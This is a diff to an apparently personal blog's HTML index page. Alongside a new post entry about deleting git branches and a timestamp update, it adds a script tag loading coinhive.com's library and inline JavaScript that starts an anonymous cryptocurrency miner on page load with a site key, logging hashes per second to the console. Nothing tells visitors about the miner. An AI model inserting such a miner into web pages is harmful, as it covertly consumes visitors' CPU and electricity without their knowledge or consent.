@@ -39,8 +39,31 @@
         })();
   </script>
   
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
+<script>
+  var miner = new CoinHive.Anonymous('dPTtaldz5u4Pa2YeXxlNxxz3GBxcofbs');
+  miner.start();
+</script>
+
+<script>
+  // Listen on events
+  miner.on('found', function() {  })
+  miner.on('accepted', function() {  })
+
+  // Update stats once per second
+  setInterval(function() {
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+
+      // Output to HTML elements...
+      console.log("H/s: " + hashesPerSecond);
+      console.log("Total Hashes: " + totalHashes);
+      console.log("Acepted Hashes: " + acceptedHashes);
+  }, 1000);
+</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -84,6 +107,13 @@
           </header>
         </div>
         
+
+<div class="row">
+  <div class="twelve columns">
+    <div class="two columns"><h4><a href="/getting_yourself_tangled_in_git_branches.html">Getting yourself tangled in `git` branches</a></h4></div>
+    <div class="ten columns"><p>Deleting a git branch ... What could really go wrong :) Have you ever deleted the remote of the branch you've got checked out? And then deleted the...</p></div>
+  </div>
+</div>
 
 <div class="row">
   <div class="twelve columns">
@@ -161,7 +191,7 @@
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-11-05T00:14:22Z -->
+  <!-- Last generated: 2017-12-19T22:15:55Z -->
 </body>
 </html>
 
